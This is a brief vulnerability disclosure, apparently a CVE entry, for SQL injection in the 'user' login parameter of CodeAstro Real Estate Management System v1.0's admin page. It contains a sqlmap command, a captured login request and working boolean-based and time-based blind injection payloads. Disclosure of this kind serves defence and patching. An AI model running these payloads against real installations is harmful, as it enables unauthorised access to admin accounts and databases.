# CVE-2025-5581

SQLi vulnerability in CodeAstro Real Estate Management System v1.0 of file /admin/index.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /admin/index.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```
POST /admin/ HTTP/1.1
Host: www.realestate.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Origin: http://www.realestate.com
Cookie: PHPSESSID=d4bb5bt4089bi920s8gj8fb0np
Content-Type: application/x-www-form-urlencoded
Referer: http://www.realestate.com/admin/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
Content-Length: 36

user=admin&pass=codeastro.com&login=
```





```
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: user=admin' AND 5594=(SELECT (CASE WHEN (5594=5594) THEN 5594 ELSE (SELECT 4066 UNION SELECT 2434) END))-- bXYR&pass=codeastro.com&login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin' AND (SELECT 9190 FROM (SELECT(SLEEP(5)))ELXO)-- zDli&pass=codeastro.com&login=
---
```



![image-20250602123658340](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202506021236537.png)